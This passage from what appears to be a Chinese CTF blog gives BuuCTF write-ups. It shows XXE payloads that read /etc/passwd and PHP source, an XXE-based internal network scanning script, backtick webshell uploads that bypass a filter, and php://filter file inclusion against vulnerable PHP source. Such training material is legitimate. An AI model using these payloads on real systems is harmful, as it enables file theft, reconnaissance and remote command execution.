alt="truecookbook5"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/truecookbook6.png" alt="truecookbook6"></p><p>伪协议读<code>doLogin.php</code>(路径根据之前的报错)</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;php://filter/read=convert.base64-encode/resource=/var/www/html/doLogin.php&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/**</span><br><span class="hljs-comment">* autor: c0ny1</span><br><span class="hljs-comment">* date: 2018-2-7</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-variable">$USERNAME</span> = <span class="hljs-string">&#x27;admin&#x27;</span>; <span class="hljs-comment">//账号</span><br><span class="hljs-variable">$PASSWORD</span> = <span class="hljs-string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="hljs-comment">//密码</span><br><span class="hljs-variable">$result</span> = <span class="hljs-literal">null</span>;<br><br><span class="hljs-title function_ invoke__">libxml_disable_entity_loader</span>(<span class="hljs-literal">false</span>);<br><span class="hljs-variable">$xmlfile</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-string">&#x27;php://input&#x27;</span>);<br><br><span class="hljs-keyword">try</span>&#123;<br><span class="hljs-variable">$dom</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">DOMDocument</span>();<br><span class="hljs-variable">$dom</span>-&gt;<span class="hljs-title function_ invoke__">loadXML</span>(<span class="hljs-variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);<br><span class="hljs-variable">$creds</span> = <span class="hljs-title function_ invoke__">simplexml_import_dom</span>(<span class="hljs-variable">$dom</span>);<br><br><span class="hljs-variable">$username</span> = <span class="hljs-variable">$creds</span>-&gt;username;<br><span class="hljs-variable">$password</span> = <span class="hljs-variable">$creds</span>-&gt;password;<br><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$username</span> == <span class="hljs-variable">$USERNAME</span> &amp;&amp; <span class="hljs-variable">$password</span> == <span class="hljs-variable">$PASSWORD</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">1</span>,<span class="hljs-variable">$username</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">0</span>,<span class="hljs-variable">$username</span>);<br>&#125;<br>&#125;<span class="hljs-keyword">catch</span>(<span class="hljs-built_in">Exception</span> <span class="hljs-variable">$e</span>)&#123;<br><span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">sprintf</span>(<span class="hljs-string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="hljs-number">3</span>,<span class="hljs-variable">$e</span>-&gt;<span class="hljs-title function_ invoke__">getMessage</span>());<br>&#125;<br><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-variable">$result</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>看了其它师傅的<code>wp</code>，这里主要是用<code>XXE</code>进行内网扫描去找存活主机(可以探测内网)<code>https://xz.aliyun.com/t/3357#toc-11</code>。</p><p>可能获取到内网ip的敏感文件：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/etc/</span>network/interfaces<br><span class="hljs-regexp">/etc/</span>hosts<br><span class="hljs-regexp">/proc/</span>net/arp<br><span class="hljs-regexp">/proc/</span>net/tcp<br><span class="hljs-regexp">/proc/</span>net/udp<br><span class="hljs-regexp">/proc/</span>net/dev<br><span class="hljs-regexp">/proc/</span>net/fib_trie<br></code></pre></td></tr></table></figure><p>尝试：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;utf-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">test</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">file</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;/proc/net/fib_trie&quot;</span>&gt;</span>]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">user</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">username</span>&gt;</span><br>        <span class="hljs-symbol">&amp;file;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">username</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">password</span>&gt;</span><br>        123<br>    <span class="hljs-tag">&lt;/<span class="hljs-name">password</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">user</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/img/xxewhat2.png" alt="xxewhat2"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#参考：https://www.cnblogs.com/Article-kelp/p/16026652.html</span><br><span class="hljs-keyword">import</span> requests <span class="hljs-keyword">as</span> res<br>url=<span class="hljs-string">&quot;http://e28cd6e3-3ea2-4656-ae5c-e267a4e7b8cd.node4.buuoj.cn:81/doLogin.php&quot;</span><br>rawPayload=<span class="hljs-string">&#x27;&lt;?xml version=&quot;1.0&quot;?&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;!DOCTYPE user [&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;!ENTITY payload1 SYSTEM &quot;http://10.244.80.&#123;&#125;&quot;&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;]&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;user&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;username&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&amp;payload1;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/username&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;password&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;23&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/password&gt;&#x27;</span>\<br>         <span class="hljs-string">&#x27;&lt;/user&gt;&#x27;</span><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">256</span>):<br>    payload=rawPayload.<span class="hljs-built_in">format</span>(i)<br>    <span class="hljs-comment">#payload=rawPayload</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(<span class="hljs-string">&quot;#&#123;&#125; =&gt;&quot;</span>).<span class="hljs-built_in">format</span>(i),end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">try</span>:<br>        resp=res.post(url,data=payload,timeout=<span class="hljs-number">0.3</span>)<br>    <span class="hljs-keyword">except</span>:<br>        <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(resp.text,end=<span class="hljs-string">&#x27;&#x27;</span>)<br>    <span class="hljs-keyword">finally</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>)<br></code></pre></td></tr></table></figure><p><img src="/img/xxewhat1.png" alt="xxewhat1"></p>]]></content>
    
    
    
    <tags>
      
      <tag>做题记录</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>BuuCTF做题记录_5</title>
    <link href="/2023/11/29/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_5/"/>
    <url>/2023/11/29/BuuCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95_5/</url>
    
    <content type="html"><![CDATA[<p>初学者的一些做题记录</p><span id="more"></span><hr><h2 id="红明谷杯2021-write-shell"><a href="#红明谷杯2021-write-shell" class="headerlink" title="[红明谷杯2021]write_shell"></a>[红明谷杯2021]write_shell</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">check</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/&#x27;| |_|php|;|~|\\^|\\+|eval|&#123;|&#125;/i&quot;</span>,<span class="hljs-variable">$input</span>))&#123;<br>        <span class="hljs-comment">// if(preg_match(&quot;/&#x27;| |_|=|php/&quot;,$input))&#123;</span><br>        <span class="hljs-keyword">die</span>(<span class="hljs-string">&#x27;hacker!!!&#x27;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$input</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">waf</span>(<span class="hljs-params"><span class="hljs-variable">$input</span></span>)</span>&#123; <span class="hljs-comment">//这东西说白了就是一层一层去检测输入的内容</span><br>  <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$input</span>))&#123;<br>      <span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$input</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$key</span>=&gt;<span class="hljs-variable">$output</span>)&#123;<br>          <span class="hljs-variable">$input</span>[<span class="hljs-variable">$key</span>] = <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$output</span>);<br>      &#125; <br>  &#125;<span class="hljs-keyword">else</span>&#123;<br>      <span class="hljs-variable">$input</span> = <span class="hljs-title function_ invoke__">check</span>(<span class="hljs-variable">$input</span>);<br>  &#125;<br>&#125;<br><br><span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;sandbox/&#x27;</span> . <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>]) . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">file_exists</span>(<span class="hljs-variable">$dir</span>))&#123;<br>    <span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$dir</span>);<br>&#125;<br><span class="hljs-keyword">switch</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;action&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>) &#123;<span class="hljs-comment">//??表示来设置默认值，即如果不存在则设置为空</span><br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;pwd&#x27;</span>:<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$dir</span>;<br>        <span class="hljs-keyword">break</span>;<br>    <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;upload&#x27;</span>:<br>        <span class="hljs-variable">$data</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;data&quot;</span>] ?? <span class="hljs-string">&quot;&quot;</span>;<span class="hljs-comment">//同上，若不存在则设置为空</span><br>        <span class="hljs-title function_ invoke__">waf</span>(<span class="hljs-variable">$data</span>);<br>        <span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-string">&quot;<span class="hljs-subst">$dir</span>&quot;</span> . <span class="hljs-string">&quot;index.php&quot;</span>, <span class="hljs-variable">$data</span>);<span class="hljs-comment">//将data写入dir/index.php</span><br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>代码其实很好理解，我们的输入(也可以是数组的形式)会经过<code>check</code>检查。检查没问题的话可以先通过<code>/?action=pwd</code>获得<code>dir</code>的值(这东西后面会去和<code>index.php</code>拼接组成完整路径)。然后<code>/?action=upload&amp;data=我们要写进去的webshell</code>会把<code>webshell</code>写到路径里。</p><p>参考：<code>https://blog.csdn.net/cjdgg/article/details/118216890</code></p><p><code>php</code>短标签：</p><p><img src="/img/writeshell1.png" alt="writeshell1"></p><p><code>php</code>中的“&#96;&#96;”也可以用来执行命令：</p><p><img src="/img/writeshell2.png" alt="writeshell2"></p><p><code>/?action=pwd</code>:</p><p><img src="/img/writeshell3.png" alt="writeshell3"></p><p><code>sandbox/c55e0cb61f7eb238df09ae30a206e5ee/</code></p><p><code>/?action=upload&amp;data=&lt;?=</code>ls<code>?&gt;</code>:</p><p>index.php</p><p><code>?action=upload&amp;data=&lt;?=</code>ls%09&#x2F;<code>?&gt;</code>(空格用<code>%09</code>代替)</p><p><img src="/img/writeshell4.png" alt="writeshell4"></p><p><code>/?action=upload&amp;data=&lt;?=</code>cat%09&#x2F;flllllll1112222222lag<code>?&gt;</code></p><h2 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h2><p><img src="/img/cyberpunk1.png" alt="cyberpunk1"></p><p>商店界面，下面还有订单管理功能：</p><p><img src="/img/cyberpunk2.png" alt="cyberpunk2"></p><p>源码中存在如下提示：</p><p><img src="/img/cyberpunk3.png" alt="cyberpunk3"></p><p><code>?file=</code>，猜测<code>GET</code>方式给<code>file</code>传参。试了试<code>/?file=flag.php</code>没啥反应。伪协议读源码试试：</p><p><code>index.php?file=php://filter/convert.base64-encode/resource=index.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&#x27;open_basedir&#x27;</span>, <span class="hljs-string">&#x27;/var/www/html/&#x27;</span>);<br><br><span class="hljs-comment">// $file = $_GET[&quot;file&quot;];</span><br><span class="hljs-variable">$file</span> = (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;file&#x27;</span>] : <span class="hljs-literal">null</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$file</span>))&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&quot;/phar|zip|bzip2|zlib|data|input|%00/i&quot;</span>,<span class="hljs-variable">$file</span>)) &#123;<br>        <span class="hljs-keyword">echo</span>(<span class="hljs-string">&#x27;no way!&#x27;</span>);<br>        <span class="hljs-keyword">exit</span>;<br>    &#125;<br>    @<span class="hljs-keyword">include</span>(<span class="hljs-variable">$file</span>);<br>&#125;<br><span class="hljs-meta">?&gt;</span><br>    <br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//?file=php://filter/convert.base64-encode/resource=search.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>; <br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123; <br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>        <span class="hljs-keyword">if</span>(!<span class="hljs-variable">$row</span>) &#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;error&#x27;</span>;<br>            <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-variable">$db</span>-&gt;error);<br>            <span class="hljs-keyword">exit</span>;<br>        &#125;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;&lt;p&gt;姓名:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_name&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;phone&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&lt;/p&gt;&quot;</span>;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;未找到订单!&quot;</span>;<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span> &#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&quot;信息不全&quot;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//?file=php://filter/convert.base64-encode/resource=change.php</span><br><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">require_once</span> <span class="hljs-string">&quot;config.php&quot;</span>;<br><br><span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]) &amp;&amp; !<span class="hljs-keyword">empty</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>]))<br>&#123;<br>    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>    <span class="hljs-variable">$pattern</span> = <span class="hljs-string">&#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;</span>;<br>    <span class="hljs-variable">$user_name</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;user_name&quot;</span>];<br>    <span class="hljs-variable">$address</span> = <span class="hljs-title function_ invoke__">addslashes</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;address&quot;</span>]);<br>    <span class="hljs-variable">$phone</span> = <span class="hljs-variable">$_POST</span>[<span class="hljs-string">&quot;phone&quot;</span>];<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$user_name</span>) || <span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-variable">$pattern</span>,<span class="hljs-variable">$phone</span>))&#123;<br>        <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;no sql inject!&#x27;</span>;<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select * from `user` where `user_name`=&#x27;<span class="hljs-subst">&#123;$user_name&#125;</span>&#x27; and `phone`=&#x27;<span class="hljs-subst">&#123;$phone&#125;</span>&#x27;&quot;</span>;<br>        <span class="hljs-variable">$fetch</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-variable">$sql</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$fetch</span>) &amp;&amp; <span class="hljs-variable">$fetch</span>-&gt;num_rows&gt;<span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-variable">$row</span> = <span class="hljs-variable">$fetch</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>();<br>        <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;update `user` set `address`=&#x27;&quot;</span>.<span class="hljs-variable">$address</span>.<span class="hljs-string">&quot;&#x27;, `old_address`=&#x27;&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;address&#x27;</span>].<span class="hljs-string">&quot;&#x27; where `user_id`=&quot;</span>.<span class="hljs-variable">$row</span>[<span class="hljs-string">&#x27;user_id&#x27;</span>];<br>        <span class="hljs-variable">$result</span> = <span 